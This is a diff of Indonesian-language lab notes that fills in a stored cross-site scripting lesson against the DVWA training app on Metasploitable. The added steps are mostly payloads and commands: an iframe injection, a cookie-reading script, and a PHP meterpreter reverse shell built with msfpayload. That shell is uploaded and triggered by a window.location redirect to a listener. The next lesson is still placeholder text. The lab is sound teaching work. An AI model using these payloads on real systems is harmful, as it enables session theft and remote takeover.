@@ -277,8 +277,66 @@ Gambar 26
 Gambar 27
 ### Lesson 9: Cross Site Scripting (XSS)
 
-"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
+1. Ubah limit script guna melancarkan aksi
+Buka metasploitable dan ketikkan perintah berikut :
+```
+cd /var/www/dvwa/vulnerabilities/xss_s/
+vi index.php
+```
+cari kata mtxMessage di vi dengan mengetik kan:
+```
+/mtxMessage
+```
+ubah maxlength yang awalnya 50 mejadi 250
 
+2. Di firefox BAcktrack  matikan fitur BLOCK POP UP WINDOWS dan nyalakan fitur ENABLE JAVASCRIPT
+3. SKenario expolit IFRAME di XSS STORED
+Login ke DVWA buka menu XSS STORED. ISi seperti di bawah ini :
+```
+    Name: Test 2
+    Message: <iframe src="http://www.cnn.com"></iframe>
+    Click Sign Guestbook
+```
+GAmbar 28
+
+4. SKenario expolit COOKIE di XSS STORED
+Login ke DVWA buka menu XSS STORED. ISi seperti di bawah ini :
+```
+    Name: Test 3
+    Message: <script>alert(document.cookie)</script>
+    Click Sign Guestbook
+```
+GAmbar 29
+5. SKenario expolit windows.location di XSS STORED
+Ketikkan perintah berikut
+```
+mkdir -p /root/backdoor
+cd /root/backdoor
+msfpayload php/meterpreter/reverse_tcp LHOST=10.0.100.102 LPORT=4444 R > FORUM_BUG.php 
+```
+Hilangkan tanda # di file FORUM_BUG.php
+Login ke DVWA buka menu upload, upload file FORUM_BUG.php
+Gambar 30
+Buka msfconsole dan ketikkan perintah berikut
+```
+use exploit/multi/handler
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 10.0.100.102
+set LPORT 4444
+exploit 
+```
+buka menu XSS STORED. ISi seperti di bawah ini :
+```
+    Name: Test 4
+    Message:
+
+    <script>window.location="http://192.168.1.106/dvwa/hackable/uploads/FORUM_BUG.php" </script>
+        Replace 192.168.1.106 with the IP Address obtain from Fedora 14 in (Section 3, Step 3).
+
+    Click Sign Guestbook
+```
+Jika berhasil , maka di msf console akan berubah jadi gambar berikut :
+Gambar 31
 ### Lesson 10: Cross Site Request Forgery combined with Curl
 
 "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
